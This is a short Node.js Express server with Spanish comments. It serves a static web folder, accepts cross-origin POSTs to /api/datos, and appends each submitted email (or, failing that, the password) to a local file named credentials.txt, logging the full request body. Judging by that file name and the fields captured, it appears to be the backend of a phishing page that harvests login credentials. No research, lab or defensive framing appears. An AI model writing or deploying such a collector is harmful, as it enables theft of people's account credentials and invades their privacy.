const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors'); // Importa cors

const app = express();
const PORT = 80; // Puedes cambiar el puerto si quieres

// Middleware para habilitar CORS desde cualquier origen
app.use(cors({
  origin: '*' // Permite solicitudes desde cualquier origen
}));

// Middleware para parsear JSON en los datos POST
app.use(express.json());

// Servir archivos estáticos desde ../web
app.use('/', express.static(path.join(__dirname, '../../web')));

// Manejar solicitudes OPTIONS para preflight (opcional pero recomendable)
app.options('*', cors());

// Ruta para recibir datos POST
app.post('/api/datos', (req, res) => {
    const datos = req.body;
    console.log('Datos recibidos:', datos);

    // Ruta del archivo donde guardar los datos
    const filePath = path.join(__dirname, 'credentials.txt');

    let content;
    try {
        content = datos['email'];
        if (!content) {
            content = datos['password'];
        }
    } catch (error) {
        console.log(error);
    }

    try {
        // Escribir en el archivo
        fs.appendFile(filePath, content + "\n", (err) => {
            if (err) {
                console.error('Error al escribir en el archivo:', err);
            }
        });
    } catch (error) {
        console.log('Error al procesar los datos:', error);
    }

    // Responder al cliente
    res.json({ mensaje: 'Datos recibidos correctamente', datos });
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});
